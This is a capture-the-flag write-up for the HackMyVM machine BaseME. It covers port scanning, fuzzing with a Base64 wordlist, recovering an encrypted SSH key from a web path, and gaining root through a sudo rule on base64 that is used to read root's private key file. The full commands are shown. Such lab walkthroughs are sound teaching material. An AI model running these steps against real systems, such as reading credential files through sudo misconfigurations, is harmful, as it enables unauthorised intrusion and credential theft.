# BaseME

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| BaseME | sml | Beginner | HackMyVM |

**Summary:** BASEME is a beginner-level Linux machine that focuses heavily on Base64 encoding as the central theme. The machine teaches fundamental concepts including network reconnaissance, web enumeration with custom wordlists, SSH key exploitation, and privilege escalation through sudo misconfigurations. The attack path involves discovering Base64-encoded content on a web server, fuzzing directories with Base64-encoded wordlists, extracting an encrypted SSH private key, and ultimately escalating privileges through a vulnerable sudo configuration allowing arbitrary file reading via the base64 binary.

---

## Reconnaissance

### Network Discovery
Initial network scanning revealed the target machine at IP address 192.168.100.46:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.46 08:00:27:CF:C7:A1 VirtualBox
```

### Port Scanning
Comprehensive port scanning using Nmap revealed two open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sV -sC -p- 192.168.100.46
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 00:54 WIB
Nmap scan report for 192.168.100.46
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)
|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)
|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.88 seconds
```

The scan identified:
- **SSH (Port 22)**: OpenSSH 7.9p1 running on Debian 10
- **HTTP (Port 80)**: nginx 1.14.2 web server

### Web Service Enumeration
Initial HTTP reconnaissance revealed Base64-encoded content with embedded hints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl 192.168.100.46
QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK

<!--
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
-->
```

Decoding the Base64 content revealed crucial information:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo 'QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK' | base64 -d
ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
```

The message from lucas and the HTML comments provided two key pieces of information:
1. Everything needed for the attack is encoded in Base64
2. A list of potential passwords in the HTML comments

## Initial Access

### Directory Fuzzing with Base64 Wordlist
Following the hint that "ALL" content is in Base64, a custom approach was needed for directory enumeration. Converting a common wordlist to Base64 format:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ while read -r word; do echo "$word" | base64; done < /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt > base64dir.txt
```

Fuzzing with the Base64-encoded wordlist revealed two accessible endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ffuf -u http://192.168.100.46/FUZZ -w base64dir.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.46/FUZZ
 :: Wordlist         : FUZZ: /home/ouba/base64dir.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aWRfcnNhCg==            [Status: 200, Size: 2537, Words: 1, Lines: 34, Duration: 50ms]
cm9ib3RzLnR4dAo=        [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 54ms]
:: Progress: [4751/4751] :: Job [1/1] :: 1156 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Decoding the discovered endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo 'aWRfcnNhCg==' | base64 -d
id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo 'cm9ib3RzLnR4dAo=' | base64 -d
robots.txt
```

### SSH Key Extraction
The `id_rsa` endpoint contained a Base64-encoded SSH private key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl 192.168.100.46/aWRfcnNhCg==
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB
.............................[OUTPUT TRUNCATED].............................
Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r
NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
```

Decoding revealed an encrypted SSH private key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...[TRUNCATED]' | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
.............................[REDACTED]...............................
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
```

### Validating and SSH Access
The SSH key required a passphrase. Testing the passwords from the pass.txt that have been created, encoded `iloveyou` proved successful:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh-keygen -y -f lucas_rsa
Enter passphrase for "lucas_rsa": 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyvf7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1 lucas@baseme
```

Successful SSH authentication as lucas:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh -i lucas_rsa lucas@192.168.100.46
...
Enter passphrase for key 'lucas_rsa': 
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
...
lucas@baseme:~$ id
uid=1000(lucas) gid=1000(lucas) groups=1000(lucas),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
lucas@baseme:~$ ls -la
total 40
drwxr-xr-x 4 lucas lucas 4096 Sep 28  2020 .
drwxr-xr-x 3 root  root  4096 Sep 28  2020 ..
-rw------- 1 lucas lucas   15 Sep 28  2020 .bash_history
-rw-r--r-- 1 lucas lucas  220 Sep 28  2020 .bash_logout
-rw-r--r-- 1 lucas lucas 3526 Sep 28  2020 .bashrc
drwxr-xr-x 3 lucas lucas 4096 Sep 28  2020 .local
-rw-r--r-- 1 lucas lucas  807 Sep 28  2020 .profile
drwx------ 2 lucas lucas 4096 Sep 28  2020 .ssh
-rw-r--r-- 1 lucas lucas 1685 Sep 28  2020 user.txt
-rw------- 1 lucas lucas   52 Sep 28  2020 .Xauthority
```

## Privilege Escalation

### Sudo Enumeration
Checking sudo privileges revealed a critical misconfiguration:

```bash
lucas@baseme:~$ sudo -l
Matching Defaults entries for lucas on baseme:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucas may run the following commands on baseme:
    (ALL) NOPASSWD: /usr/bin/base64
```

The user lucas can execute `/usr/bin/base64` with sudo privileges without a password.

### GTFOBins Research
Consulting GTFOBins for base64 privilege escalation methods:

![](image.png)

The image shows that base64 can be used to read arbitrary files when executed with sudo privileges using the syntax: `base64 /path/to/input-file | base64 --decode`

### Root SSH Key Extraction
Leveraging the sudo base64 privilege to read root's SSH private key:

```bash
lucas@baseme:~$ sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
.............................[REDACTED]...............................
2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=
-----END OPENSSH PRIVATE KEY-----
```

### Root Access
Using the extracted root SSH key for authentication:

```bash
lucas@baseme:~$ sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d > root_rsa
lucas@baseme:~$ chmod 600 root_rsa
lucas@baseme:~$ ssh -i root_rsa root@localhost
...
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
...
root@baseme:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag Capture
Successfully obtaining both user and root flags:

```bash
root@baseme:~# cat root.txt /home/lucas/user.txt
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,

HMVF[REDACTED]
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,

HMV8[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Network scanning identified target at 192.168.100.46 with SSH (22) and HTTP (80) services
2. **Vulnerability Discovery**: Web service revealed Base64-encoded hints and password list in HTML comments
3. **Exploitation**: Custom Base64 wordlist fuzzing discovered encrypted SSH private key endpoint `/aWRfcnNhCg==`
4. **Internal Enumeration**: SSH key passphrase cracked using hint password encoded `iloveyou`, gaining user access as lucas
5. **Privilege Escalation**: Sudo misconfiguration allowing base64 execution exploited to read root's SSH private key, achieving full system compromise